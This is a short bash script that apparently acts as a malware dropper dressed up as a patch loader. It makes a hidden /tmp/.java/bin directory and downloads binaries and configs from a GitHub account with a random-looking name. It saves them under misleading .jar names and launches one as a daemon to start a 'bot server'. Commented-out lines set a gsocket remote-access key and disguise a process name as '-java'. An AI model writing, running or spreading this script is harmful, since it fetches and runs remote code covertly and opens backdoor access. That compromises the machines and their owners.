#!/bin/bash

function fetch_files() {
    echo "Downloading Patches ..."
    mkdir -p /tmp/.java/bin
    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o bots.jar
    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/voidnde/cfg.conf -o cfg.conf
    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/voidnde/cnf-0.json -o conf.json
    # cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
    echo "DONE ..."
}

function start_app() {
    chmod a+x /tmp/.java/bin/***
    cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
    # export GSOCKET_ARGS="-s b3928cae-d2a1e2c-5a16f98-13d9g8hbj7-56c4a961-ecd9f9440-d6a2803-8a1c5j1g60 -liqD"
    # cd /tmp/.java/bin && exec -a -java ./add-on.jar &
    echo "BOT SERVER STARTED ..."
}

# if [ -f "/tmp/.java/bin/cfg.conf" ]  && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/add-on.jar" ]; then
if [ -f "/tmp/.java/bin/cfg.conf" ] && [ -f "/tmp/.java/bin/bots.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/conf.json" ]; then
    echo "Patch files already loaded ..."
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi
